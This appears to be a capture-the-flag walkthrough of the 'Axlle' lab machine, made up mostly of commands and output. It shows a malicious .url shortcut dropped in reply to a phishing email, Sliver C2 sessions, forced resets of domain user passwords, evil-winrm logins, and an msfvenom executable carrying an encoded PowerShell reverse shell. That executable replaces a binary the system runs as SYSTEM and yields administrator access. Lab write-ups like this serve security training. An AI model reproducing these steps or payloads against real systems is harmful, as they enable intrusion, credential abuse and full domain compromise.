
```
PS C:\Program Files (x86)\hmailserver\Data\axlle.htb\dallon.matrix\2f> type '{2F7523BD-628F-4359-913E-A873FCC59D0F}.eml'
Return-Path: webdevs@axlle.htb
Received: from bumbag (Unknown [192.168.77.153])
	by MAINFRAME with ESMTP
	; Mon, 1 Jan 2024 06:32:24 -0800
Date: Tue, 02 Jan 2024 01:32:23 +1100
To: dallon.matrix@axlle.htb,calum.scott@axlle.htb,trent.langdon@axlle.htb,dan.kendo@axlle.htb,david.brice@axlle.htb,frankie.rose@axlle.htb,samantha.fade@axlle.htb,jess.adams@axlle.htb,emily.cook@axlle.htb,phoebe.graham@axlle.htb,matt.drew@axlle.htb,xavier.edmund@axlle.htb,baz.humphries@axlle.htb,jacob.greeny@axlle.htb
From: webdevs@axlle.htb
Subject: OSINT Application Testing
Message-Id: <20240102013223.019081@bumbag>
X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/

Hi everyone,

The Web Dev group is doing some development to figure out the best way to automate the checking and addition of URLs into the OSINT portal.

We ask that you drop any web shortcuts you have into the C:\inetpub\testing folder so we can test the automation.

Yours in click-worthy URLs,

The Web Dev Team


PS C:\Program Files (x86)\hmailserver\Data\axlle.htb\dallon.matrix\2f>

```

Keyword **web shortcuts**

```
kali@kali ~> cat shortcut.url
[InternetShortcut]
URL=C:\inetpub\testing\shell.exe
IDList=
IconFile=http://www.cum.com/favicon.ico
IconIndex=1
```


```
[server] sliver > jobs

 ID   Name   Protocol   Port   Stage Profile
==== ====== ========== ====== ===============
 1    mtls   tcp        8888

[*] Session 6d4dc5e3 SCRAWNY_ALLEY - 10.129.12.242:50733 (MAINFRAME) - windows/amd64 - Wed, 26 Jun 2024 07:20:41 EDT

[server] sliver > sessions

 ID         Name            Transport   Remote Address        Hostname    Username              Operating System   Locale   Last Message                            Health
========== =============== =========== ===================== =========== ===================== ================== ======== ======================================= =========
 6d4dc5e3   SCRAWNY_ALLEY   mtls        10.129.12.242:50733   MAINFRAME   AXLLE\dallon.matrix   windows/amd64      en-US    Wed Jun 26 07:20:41 EDT 2024 (3s ago)   [ALIVE]

```


```
[server] sliver > jobs

 ID   Name   Protocol   Port   Stage Profile
==== ====== ========== ====== ===============
 1    mtls   tcp        8888

[*] Session 6d4dc5e3 SCRAWNY_ALLEY - 10.129.12.242:50733 (MAINFRAME) - windows/amd64 - Wed, 26 Jun 2024 07:20:41 EDT

[server] sliver > sessions

 ID         Name            Transport   Remote Address        Hostname    Username              Operating System   Locale   Last Message                            Health
========== =============== =========== ===================== =========== ===================== ================== ======== ======================================= =========
 6d4dc5e3   SCRAWNY_ALLEY   mtls        10.129.12.242:50733   MAINFRAME   AXLLE\dallon.matrix   windows/amd64      en-US    Wed Jun 26 07:20:41 EDT 2024 (3s ago)   [ALIVE]

```


![[Foothold-20240626145543437.webp]]

https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword

So we cant do it remotely because we dont have the password. instead ill use the powerview model to change the password locally
```
$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'baz.humphries' -AccountPassword $NewPassword
```

```
$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'jacob.greeny' -AccountPassword $NewPassword
```

lets verify if we have a shell

```
kali@kali ~> nxc smb 10.129.12.242 -u 'baz.humphries' -p 'Password123!'
SMB         10.129.12.242   445    MAINFRAME        [*] Windows Server 2022 Build 20348 x64 (name:MAINFRAME) (domain:axlle.htb) (signing:True) (SMBv1:False)
SMB         10.129.12.242   445    MAINFRAME        [+] axlle.htb\baz.humphries:Password123!
```

```
kali@kali ~> nxc smb 10.129.12.242 -u 'jacob.greeny' -p 'Password123!'
SMB         10.129.12.242   445    MAINFRAME        [*] Windows Server 2022 Build 20348 x64 (name:MAINFRAME) (domain:axlle.htb) (signing:True) (SMBv1:False)
SMB         10.129.12.242   445    MAINFRAME        [+] axlle.htb\jacob.greeny:Password123!
```

```
[server] sliver (SCRAWNY_ALLEY) > upload runascs.ps1

[*] Wrote file to C:\Users\dallon.matrix\tmp\runascs.ps1
[server] sliver (SCRAWNY_ALLEY) > shell

? This action is bad OPSEC, are you an adult? Yes

[*] Wait approximately 10 seconds after exit, and press <enter> to continue
[*] Opening shell tunnel (EOF to exit) ...

[*] Started remote shell with pid 1260
PS C:\Users\dallon.matrix\tmp> . .\runascs.ps1
. .\runascs.ps1
PS C:\Users\dallon.matrix\tmp> Invoke-RunasCs baz.humphries Password123! "cmd /c whoami /all"
Invoke-RunasCs baz.humphries Password123! "cmd /c whoami /all"
[*] Warning: The logon for user 'baz.humphries' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.


USER INFORMATION
----------------

User Name           SID
=================== =============================================
axlle\baz.humphries S-1-5-21-1005535646-190407494-3473065389-1126


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Log Users              Alias            S-1-5-32-559                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Group used for deny only
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
AXLLE\App Devs                             Group            S-1-5-21-1005535646-190407494-3473065389-1108 Mandatory group, Enabled by default, Enabled group
AXLLE\Employees                            Group            S-1-5-21-1005535646-190407494-3473065389-1103 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

```


```
kali@kali ~> evil-winrm -i 10.129.12.242 -u 'jacob.greeny' -p 'Password123!'
```

```
*Evil-WinRM* PS C:\Users\jacob.greeny> dir


    Directory: C:\Users\jacob.greeny


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---          5/8/2021   1:20 AM                Desktop
d-r---         6/26/2024   5:36 AM                Documents
d-r---          5/8/2021   1:20 AM                Downloads
d-r---          5/8/2021   1:20 AM                Favorites
d-r---          5/8/2021   1:20 AM                Links
d-r---          5/8/2021   1:20 AM                Music
d-r---         6/13/2024   1:41 AM                OneDrive
d-r---          5/8/2021   1:20 AM                Pictures
d-----          5/8/2021   1:20 AM                Saved Games
d-r---          5/8/2021   1:20 AM                Videos
-a----         6/26/2024   5:45 AM       10020352 SILKY_OBJECT.exe
-a----         6/26/2024   5:56 AM       10020352 SUFFICIENT_OBSERVATION.exe


*Evil-WinRM* PS C:\Users\jacob.greeny> .\SUFFICIENT_OBSERVATION.exe
*Evil-WinRM* PS C:\Users\jacob.greeny> .\SILKY_OBJECT.exe
*Evil-WinRM* PS C:\Users\jacob.greeny> .\SILKY_OBJECT.exe

```

we traverse to the C:\ directory again and we find app development, we need to remember we didnt have access to it then we will have access to it now

```
[server] sliver (SUFFICIENT_OBSERVATION) > cat README.md

# Keyboard Translation Program
This is an application in development that uses a WDF kbfiltr as the basis for a translation program. The aim of this application is to allow users to program and simulate custom keyboard layouts for real or fictional languages.

## Features
- Create custom keyboard layouts for real or fictional languages.
- Simulate keyboard inputs using the custom layouts.
- Secret codes to switch between languages and logging output.

## Progress
- kbfiltr driver - Complete
- Keyboard mapping - Complete (hardcoded in driver)
- Custom mapping in application layer - In progress
- Logging - Complete
- Activation of logging - Complete
- Simulation of other keyboard layouts - Incomplete
- Activation of other keyboard layouts - Incomplete

**NOTE: I have automated the running of `C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe` as SYSTEM to test and debug this driver in a standalone environment**

## Prerequisites
- Windows 10 or higher
- Visual Studio 2019
- Windows Driver Kit (WDK) 10

## Getting Started
- Clone this repository.
- Open the solution file in Visual Studio.
- Build the solution in Release mode.
- Install the driver by running `.\devcon.exe install .\kbfiltr.inf "*PNP0303"` as Administrator.
- Install the driver as an upperclass filter with `.\devcon.exe /r classfilter keyboard upper -keylogger` as Administrator.
- Install the application by running the install_app.bat file as Administrator.
- Reboot your computer to load the driver.
- Launch the application and start programming your custom keyboard layouts.

## Usage
### Programming a Custom Layout
- Launch the application.
- Click on the Program Layout button.
- Select the language for which you want to program the layout.
- Select the key you want to modify from the list.
- Modify the key's scancode and virtual key code as required.
- Repeat steps 4 and 5 for all the keys you want to modify.
- Save the layout by clicking on the Save Layout button.

### Simulating Inputs
- Launch the application.
- Click on the Simulate Input button.
- Select the language for which you want to simulate the input.
- Type in the input in the normal English layout.
- Trigger language switch as outlined below (when required).
- Verify that the input is translated to the selected language.

### Logging Output
- Launch the application.
- Turn on logging (shortcuts can be created as explained below)
- Use the application as normal.
- The log file will be created in the same directory as the application.

## Triggering/Activation
- To toggle logging output, set up a shortcut in the options menu. INCOMPLETE
- To switch to a different language, press the Left Alt key and the Right Ctrl key simultaneously. INCOMPLETE

## Bugs
There are probably several.

```


```
kali@kali ~> msfvenom -p windows/exec CMD="powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUA
YwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAiACwAOQAxADEAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" -f exe -o standalonerunner.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 1531 bytes
Final size of exe file: 73802 bytes
Saved as: standalonerunner.exe
kali@kali ~> rlwrap -crA nc -lvnp 9111
listening on [any] 9111 ...
connect to [10.10.16.3] from (UNKNOWN) [10.129.12.242] 55823
whoami
axlle\administrator
PS C:\>

```


```
[server] sliver (SUFFICIENT_OBSERVATION) > upload standalonerunner.exe

[*] Wrote file to C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe

[server] sliver (SUFFICIENT_OBSERVATION) > ls

C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64 (2 items, 114.7 KiB)
==================================================================================================
-rw-rw-rw-  standalonerunner.exe  72.1 KiB  Wed Jun 26 07:30:31 -0700 2024
-rw-rw-rw-  standalonexml.dll     42.6 KiB  Sat Sep 30 03:08:26 -0700 2023


```


```
[server] sliver (SUFFICIENT_OBSERVATION) > upload standalonerunner.exe

[*] Wrote file to C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe

[*] Session 51fa7e73 PROPOSED_NOTE - 10.129.12.242:55835 (MAINFRAME) - windows/amd64 - Wed, 26 Jun 2024 10:34:14 EDT

[server] sliver (SUFFICIENT_OBSERVATION) > sessions

 ID         Name                     Transport   Remote Address        Hostname    Username              Operating System   Locale   Last Message                               Health
========== ======================== =========== ===================== =========== ===================== ================== ======== ========================================== =========
 51fa7e73   PROPOSED_NOTE            mtls        10.129.12.242:55835   MAINFRAME   AXLLE\Administrator   windows/amd64      en-US    Wed Jun 26 10:34:14 EDT 2024 (5s ago)      [ALIVE]
 8bc45187   SCRAWNY_ALLEY            mtls        10.129.12.242:63591   MAINFRAME   AXLLE\dallon.matrix   windows/amd64      en-US    Wed Jun 26 10:32:56 EDT 2024 (1m23s ago)   [ALIVE]
 a2d4b41b   SCRAWNY_ALLEY            mtls        10.129.12.242:63592   MAINFRAME   AXLLE\dallon.matrix   windows/amd64      en-US    Wed Jun 26 10:32:55 EDT 2024 (1m24s ago)   [ALIVE]
 7f3969f1   SUFFICIENT_OBSERVATION   mtls        10.129.12.242:55760   MAINFRAME   AXLLE\jacob.greeny    windows/amd64      en-US    Wed Jun 26 10:34:10 EDT 2024 (9s ago)      [ALIVE]

```


